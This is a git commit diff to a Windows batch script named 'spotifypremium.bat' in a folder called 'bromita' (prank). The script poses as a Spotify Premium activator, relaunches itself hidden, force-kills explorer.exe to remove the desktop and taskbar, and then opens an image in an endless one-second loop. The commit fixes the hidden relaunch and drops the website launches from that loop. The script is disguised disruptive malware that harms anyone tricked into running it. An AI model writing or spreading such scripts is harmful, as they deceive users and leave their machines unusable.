cfa598b5fde359b15736671225b5d7e0c828e4b7
pabloc25 <pablocarfor@gmail.com>
2025-02-12 10:24:34 +0100

    refactor: update image path and remove unnecessary website launches in spotify activation script

--- bromita/spotifypremium.bat
+++ bromita/spotifypremium.bat
@@ -5,12 +5,13 @@ echo Cargando archivos del sistema para activar spotify...
 timeout /t 3 /nobreak >nul
 
 :: Ocultar la ventana del script al ejecutarse
+if "%1"=="hidden" goto hidden
 start /min cmd /c "%~f0 hidden"
 exit
 
 :hidden
 :: Ruta de la imagen (¡Cámbiala por la tuya!)
-set img="image.jpg"
+set img=".\image.jpg"
 
 :: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
 taskkill /f /im explorer.exe
@@ -18,10 +19,6 @@ taskkill /f /im explorer.exe
 :: Bucle infinito para abrir imágenes y páginas web
 :loop
 start %img%
-start https://www.google.com
-start https://www.youtube.com
-start https://www.facebook.com
-start https://www.tiktok.com
-start https://www.netflix.com
+
 timeout /t 1 /nobreak >nul
 goto loop
